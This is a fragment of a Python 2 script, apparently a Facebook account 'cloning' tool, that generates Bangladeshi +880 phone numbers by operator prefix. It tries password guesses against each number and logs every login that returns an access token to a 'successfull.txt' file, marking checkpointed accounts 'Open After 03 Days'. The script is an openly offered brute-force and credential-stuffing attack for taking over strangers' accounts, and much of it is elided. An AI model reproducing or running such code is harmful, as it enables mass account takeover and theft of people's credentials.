...
os.system('clear')
psb('\x1b[1;32mBangladesh 11 Digit Number Clonig Provide By Rajvir..........')
for n in range(9999):
...
def menu():
    ...
    print ''
    print 'Owner  : Rajvir'
    print 'Facebook Page : http://m.me/Rajvir.071'
    print 'GITHUB     : github.com/Rajvir0'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP-017'
    print '[2]  \x1b[1;92mRobi-018'
    print '[3]  \x1b[1;96mAirtel-016'
    print '[4]  \x1b[1;92mBanglalink-019'
    print '[5]  \x1b[1;93mTeletalk-015'
...
def action():
    ...
    if bch == '':
        ...
        print ''
        try:
            c = raw_input(' Choose Number Code  : ')
            k = '+880'
            idlist = '.txt'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[DkRaj-Ok]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[DkRaj-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
